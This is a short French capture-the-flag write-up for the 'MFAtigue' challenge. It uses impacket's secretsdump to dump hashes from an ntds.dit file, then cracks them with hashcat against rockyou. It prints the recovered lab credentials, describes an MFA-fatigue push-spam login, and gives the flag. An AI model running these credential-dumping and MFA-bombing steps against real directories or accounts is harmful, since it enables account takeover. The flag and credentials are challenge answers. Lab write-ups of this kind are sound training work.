# MFAtigue

__author__: Adam Rice

__synopsis__: We got our hands on an NTDS file, and we might be able to break into the Azure Admin account! Can you track it down and try to log in? They might have MFA set up though...

Download the file(s) below and press the Start button on the top-right to begin this challenge.

__Attachements__: NTDS.zip

---

Après un petite recherche, on fait le lien entre ntds.dit et impacket.

Malheureusement, je n'ai pas su faire fonctionner durant le ctf.

Résolu **APRÈS** le ctf.

```bash
pipx install impacket
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL | grep -i -E "huntress" > hashdump
```

il va dump les creds dans le fichier hashdump, il nous reste plus qu'a hashcat

```bash
hashcat -a 0 -m 1000 hashdump /opt/SecLists/Passwords/rockyou.txt --username
```
il va trouver le mot de passe suivant dans toute la liste:

**08e75cc7ee80ff06f77c3e54cadab42a:katlyn99**

On grep rapidement dans le fichier pour retrouver le username associé:

**huntressctf.local\JILLIAN_DOTSON**:1113:aad3b435b51404eeaad3b435b51404ee:08e75cc7ee80ff06f77c3e54cadab42a:::

Les ID à utiliser sont les suivants:

**huntressctf\JILLIAN_DOTSON:katlyn99**

Il ne reste plus qu'a aller sur le site, se log, et spam la requête de MFA, afin de trigger le MFAtigue (attaque réelle)


le flag pour ce chall:

flag{9b896a677de35d7dfa715a05c25ef89e}
